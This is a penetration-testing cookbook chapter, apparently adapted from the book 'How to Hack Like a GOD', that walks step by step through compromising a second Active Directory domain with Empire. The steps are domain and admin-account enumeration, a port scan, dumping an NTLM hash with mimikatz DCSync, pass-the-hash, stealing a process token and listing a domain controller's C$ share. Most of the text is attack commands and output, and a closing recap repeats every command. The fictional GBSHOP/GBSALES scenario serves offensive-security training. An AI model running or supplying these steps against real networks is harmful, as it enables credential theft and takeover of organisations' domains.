# Pass-the-hash

*Note: this section continues from the previous cookbook on abusing domain trust with Empire and follows demonstrations from the book "How to Hack Like a GOD: Master the Secrets of Hacking Through Real Life Scenarios" (continuing from page no. 87)*

To strategize our movement within the GBSALES domain, we first need to understand its layout. We use the get_domain_controller reconnaissance module to list all domain controllers in GBSALES:

```
(Empire: DCshop) > usemodule situational_awareness/network/powerview/get_domain_controller
(Empire: get_domain_controller) > set Domain GBSALES.CORP
(Empire: get_domain_controller) > execute
Job started: Debug32_rx9ml

Forest         OSVersion          Domain          IPAddress
-----------------------------------------------------------
GBSALES.CORP  Windows Server 2012 R2  GBSALES.CORP  10.30.30.88
GBSALES.CORP  Windows Server 2012 R2  GBSALES.CORP  10.30.30.89
```

The output reveals a couple of domain controllers for GBSALES, indicating this domain is part of a different Forest (GBSALES.CORP). If it were in the same Forest as GBSHOP, we could potentially use the krbtgt account from GBSHOP.

Next, we need to enumerate all Windows hosts in the GBSALES domain to gauge the size of the target:

```
(Empire: DCshop) > usemodule situational_awareness/network/powerview/get_computer
(Empire: get_computer) > set Domain GBSALES.CORP
(Empire: get_computer) > execute
Job started: Debug32_5u89t

SL0009.GBSALES.CORP
SL0010.GBSALES.CORP
SL0011.GBSALES.CORP
SL0012.GBSALES.CORP
[...]
SL0088.GBSALES.CORP
SL0089.GBSALES.CORP
SL0090.GBSALES.CORP
[...]
SL0210.GBSALES.CORP
Get-NetComputer completed!
```

Compared to GBSHOP, which had only a few servers, GBSALES is significantly larger with a total of 350 hosts. Among these, note the SL0210 server (10.30.30.210), which is known from previous scripts to be a central hub for sales data.

A quick port scan on the SL0210 server reveals the following:

```
(Empire: DCshop) > usemodule situational_awareness/network/portscan
(Empire: portscan) > set Ports 135
(Empire: portscan) > set Hosts SL0210.GBSALES.CORP
(Empire: portscan) > execute
Job started: Debug32_hp38u

Hostname                OpenPorts
-------------------------------
SL0210.GBSALES.CORP     135
```

The scan confirms that port 135 (RPC) is open on the FTP server. With this information, if we manage to gain privileged credentials on the GBSALES domain, we can effectively target the SL0210 FTP server without needing to deploy a reverse agent on GBSALES domain controllers.

To continue our reconnaissance, we list domain admin accounts in the GBSALES domain:

```
(Empire: DCshop) > usemodule situational_awareness/network/powerview/get_user
(Empire: get_user) > set Filter adminCount=1
(Empire: get_user) > set Domain GBSALES.CORP
(Empire: get_user) > execute
Job started: Debug32_qa90a

distinguishedname                                      name          objectsid                                         admincount
--------------------------------------------------------------------------------------------------------------
CN=Administrator,CN=Users,DC=GBSALES,DC=CORP          Administrator S-1-5-21-2376009117-2296651833-4279148973-500  1
CN=joe_adm,CN=Users,DC=GBSALES,DC=CORP                joe_adm      S-1-5-21-2376009117-2296651833-4279148973-1116  1
CN=phoebe_adm,CN=Users,DC=GBSALES,DC=CORP             phoebe_adm   S-1-5-21-2376009117-2296651833-4279148973-1121  1
CN=sysback,CN=Users,DC=GBSALES,DC=CORP                sysback     S-1-5-21-2376009117-2296651833-4279148973-1117  1
```

Interestingly, the same sysback account, presumably a backup account, appears on both GBSHOP and GBSALES domains. The domain admin accounts on GBSHOP were: Administrator, georges_adm, rachel_adm, sysback.

Given that sysback is present in both domains, there’s a possibility that the password for this account might be the same across both domains. It’s worth trying the same credentials to see if they work on GBSALES.

*Note: sysback is probably used to manage and perform system backups and restores. Backup accounts usually have elevated privileges to ensure they can access and secure data across various systems. Besides backups, such an account might be involved in administrative tasks like system maintenance, configurations, and managing backup schedules.*

To exploit the sysback account from the GBShop domain and authenticate to the GBSALES domain, we will leverage a technique known as pass-the-hash. This method allows us to authenticate without cracking the password hash due to the nature of NTLM authentication in Windows.

When a server requests authentication from a client, the client sends a response that includes a hashed value of the password combined with a random number. Specifically, it sends hash(H + random_number), where H is the NTLM hash of the password. This means that having the NTLM hash alone is sufficient to generate a valid authentication response. Despite being a technique from about 20 years ago, pass-the-hash remains a potent method for bypassing authentication.

To obtain the NTLM hash for the sysback account, we use the DCSync module:

```
(Empire: DCshop) > usemodule credentials/mimikatz/dcsync
(Empire: dcsync) > set user sysback
(Empire: dcsync) > set domain GBSHOP.CORP
(Empire: dcsync) > run
Job started: Debug32_sd5v1

Hostname: SV0199.GBSHOP.CORP / S-1-5-21-2376009117-2296651833-4279148973
.#####.
 mimikatz 2.1 (x64) built on Mar 31 2016
.## ^ ##. "A La Vie, A L'Amour"
## / \ ## /* * *
## \ / ##
 Benjamin DELPY `gentilkiwi`
'## v ##'
 http://blog.gentilkiwi.com/mimikatz (oe.eo)
'#####'
 with 18 modules * * */
mimikatz(powershell) # lsadump::dcsync /user:sysback /domain:GBSHOP.CORP
[DC] 'GBSHOP.CORP' will be the domain
[DC] 'SV0199.GBSHOP.CORP' will be the DC server
[DC] 'sysback' will be the user account
** SAM ACCOUNT **
SAM Username        : sysback
User Principal Name : sysback@GBSHOP.CORP
[...]
Credentials:
Hash NTLM: 26bc129c0ea27a6e66cfaf3080fb7947
```

With the NTLM hash for sysback, we can now spawn a new process on the server that will use this hash for authentication. This process will effectively impersonate the sysback account, assuming that the password hash is the same across both domains.

It’s important to note that successfully spawning a process with the NTLM hash does not confirm that the password is correct. The actual test of authentication will occur when the process tries to access remote resources, verifying if the hash can indeed authenticate across domains.

To authenticate using the sysback hash on the GBSALES domain, we proceed with the following steps:

```
(Empire: DCshop) > usemodule credentials/mimikatz/pth
(Empire: pth) > set user sysback
(Empire: pth) > set domain GBSALES.CORP
(Empire: pth) > set ntlm 26bc129c0ea27a6e66cfaf3080fb7947
(Empire: pth) > run
```

After running the command, the critical piece of information to look for is the Process ID (PID). Assume we have PID 3116.

If we were in an interactive graphical session, we would see a new window open under the sysback account. However, since we're using a reverse connection with Empire, the window remains hidden.

The newly spawned cmd.exe process runs with sysback's identity. This identity is represented by a security token in memory, akin to a web session cookie—it contains information about the user's privileges and identity.

To obtain sysback's security token, we use the following command to ‘steal’ it from the new process:

```
(Empire: dcsync) > interact DCshop
(Empire: DCshop) > steal 3116
(Empire: DCshop) >
Running As: GBSALES\rachel_adm
Use Credentials/tokens with RevToSelf option to revert token privileges
```

With sysback's token now available, we test whether sysback's password from GBSALES is indeed the same as the one in GBShop by executing a remote action. For example, we can list the protected C$ share on the GBSALES DC:

```
(Empire: dcshop) > dir \\10.30.30.88\c$
```

The successful execution of this command indicates that the sysback account has been authenticated, confirming access to the second domain. By leveraging the pass-the-hash technique and successfully acquiring and using sysback's token, we were able to authenticate on the GBSALES domain and perform actions, effectively breaching the second domain.

**Useful notes (Empire modules recap):**

1. get_domain_controller

- Lists all domain controllers within the specified domain (identifies domain controllers in the GBSALES domain, helping to understand the domain’s layout and structure):

```
(Empire: DCshop) > usemodule situational_awareness/network/powerview/get_domain_controller
(Empire: get_domain_controller) > set Domain GBSALES.CORP
(Empire: get_domain_controller) > execute
```

2. get_computer

- Enumerates all Windows hosts in the specified domain (lists all computers in the GBSALES domain to assess the target's scope and identify key servers like SL0210:

```
(Empire: DCshop) > usemodule situational_awareness/network/powerview/get_computer
(Empire: get_computer) > set Domain GBSALES.CORP
(Empire: get_computer) > execute
```

3. portscan

- Performs a port scan on specified hosts (checks for open ports on the SL0210 server to confirm it is reachable and assess potential targets for exploitation):

```
(Empire: DCshop) > usemodule situational_awareness/network/portscan
(Empire: portscan) > set Ports 135
(Empire: portscan) > set Hosts SL0210.GBSALES.CORP
(Empire: portscan) > execute
```

4. get_user

- Lists domain admin accounts in the specified domain (identifies domain admin accounts, revealing potential targets and confirming if the sysback account exists in both domains):

```
(Empire: DCshop) > usemodule situational_awareness/network/powerview/get_user
(Empire: get_user) > set Filter adminCount=1
(Empire: get_user) > set Domain GBSALES.CORP
(Empire: get_user) > execute
```

5. dcsync

- Retrieves password hashes and other credentials from domain controllers (dumps the NTLM hash for the sysback account from the GBSHOP domain, which is then used for pass-the-hash authentication):

```
(Empire: DCshop) > usemodule credentials/mimikatz/dcsync
(Empire: dcsync) > set user sysback
(Empire: dcsync) > set domain GBSHOP.CORP
(Empire: dcsync) > run
```

6. pth

- Performs pass-the-hash attacks by authenticating with NTLM hashes (uses the NTLM hash to spawn a process on the GBSALES domain, allowing authentication as the sysback account):

```
(Empire: DCshop) > usemodule credentials/mimikatz/pth
(Empire: pth) > set user sysback
(Empire: pth) > set domain GBSALES.CORP
(Empire: pth) > set ntlm 26bc129c0ea27a6e66cfaf3080fb7947
(Empire: pth) > run
```

7. interact

- Interacts with a process to obtain its security token (steals the security token from the spawned process to validate sysback's credentials and access remote resources):

```
(Empire: dcsync) > interact DCshop
(Empire: DCshop) > steal 3116
```

This recap summarizes the key functions and uses of each module involved in the pass-the-hash attack within this cookbook.
